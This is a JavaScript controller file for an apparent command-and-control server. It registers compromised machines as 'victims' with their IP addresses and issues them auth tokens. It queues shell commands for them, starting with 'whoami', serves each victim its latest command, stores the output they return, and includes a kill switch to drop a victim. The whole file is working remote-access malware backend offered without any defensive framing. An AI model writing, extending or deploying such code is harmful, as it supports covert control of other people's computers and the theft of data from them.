const mongodb = require("../models/mongodb");
const helper = require("../helpers/common");
const sanitize = require("mongo-sanitize");
const authMiddleware = require("../middleware/authMiddleware");

async function initialHandshake(req, res) {

	console.log('Hit !');

	const ipv4 = req.ip;
	const currentDate = new Date();
	const victimName = sanitize(req.body["victimName"]);
	const victimAdditionalinfo = sanitize(req.body["victimAdditionalinfo"]);

	if (!victimName) {
		return res.send({ status: false, message: "Broken request" });
	} else {
		const record = new mongodb.Victims({
			ipv4: ipv4,
			victimName: victimName,
			victimAdditionalinfo: victimAdditionalinfo,
			handshakeDate: currentDate,
			heartBeatInterval: 60, // in seconds
		});

		await record
			.save()
			.then(async () => {
				console.info("New victim joined with id: " + record._id);
				const firstPlaceholderCmd = new mongodb.VictimCommands({
					victimId: record._id,
					command: "whoami",
					active: true,
				});
				
				await firstPlaceholderCmd.save().then(() => {
					console.info("saved placeholder cmd for victim: " + record._id)
				}).catch((err) => {
					console.error("failed to save placeholder cmd for victim: " + record._id);
				})

				const RefreshToken = await authMiddleware.generateRefreshToken(
					record._id,
					"victim",
				);
				const JwtToken = authMiddleware.generateJwtToken(record._id, "victim");

				return res
					.status(200)
					.send({ status: true, JwtToken, RefreshToken, Username: record._id });
			})
			.catch((err) => {
				console.log(err);
				return res
					.status(500)
					.send({ status: false, message: "Unknown error" });
			});
	}
}

async function getCmd(req, res) {
	const username = req.decoded["username"];

	const filterVictim = { victimId: username, active: true }; // desired filter criteria

	const victimCmdList = await mongodb.VictimCommands.find(filterVictim)
		.sort({ timestamp: -1 }) // Sort in descending order based on timestamp
		.limit(1) // Limit the result to 1 record (the latest one)
		.exec();
	
	let obj = {};

	if (victimCmdList.length > 0) {
		const latestCmd = victimCmdList[0];

		obj.commandId = latestCmd._id;
		obj.command = latestCmd.command;
		obj.active = latestCmd.active;
		obj.victimId = latestCmd.victimId;

		return res.status(200).send({
			status: true,
			obj,
		});
	} else {
		console.log("No commands found for the victim.");
		return res.status(400).send({
			status: false,
			message: "No commands found for the victim.",
		});
	}
}

async function postResult(req, res) {
	const username = req.decoded["username"];

	const { result, commandId } = req.body;

	if (!username || !result || !commandId) {
		return res.send({ status: false, message: "Broken request" });
	} else {
		const commandResult = new mongodb.CommandResults({
			commandId: sanitize(commandId),
			result: sanitize(result),
			victimId: sanitize(username),
			resultRecievedOn: new Date(),
		});

		await commandResult
			.save()
			.then(() => {
				return res.send({
					status: true,
					message: "Command result saved successfully",
				});
			})
			.catch((e) => {
				console.log(e);

				return res
					.status(500)
					.send({ status: false, message: "Unknown error" });
			});
	}
}

async function killSwitch(req, res) {
	const username = req.username;

	if (!username) {
		return res.status(200).send({ status: false, message: "Broken request" });
	} else {
		try {
			await mongodb.Victims.deleteOne({ victimId: sanitize(username) }).exec();
			return res.status(200).send({ status: true, data: "Killed victim" });
		} catch (e) {
			console.log(e);
			return res
				.status(500)
				.send({ status: false, data: "Unknown error occured" });
		}
	}
}

const refresh = async (req, res) => {
	const refreshToken = req.body.refreshToken;
	const username = req.body.username;

	if (!refreshToken || refreshToken == undefined) {
		return res.send({ message: "No Token Provided!" });
	}
	await authMiddleware.verifyRefreshToken(refreshToken, username, res);
};

module.exports = {
	initialHandshake,
	getCmd,
	postResult,
	killSwitch,
	refresh,
};
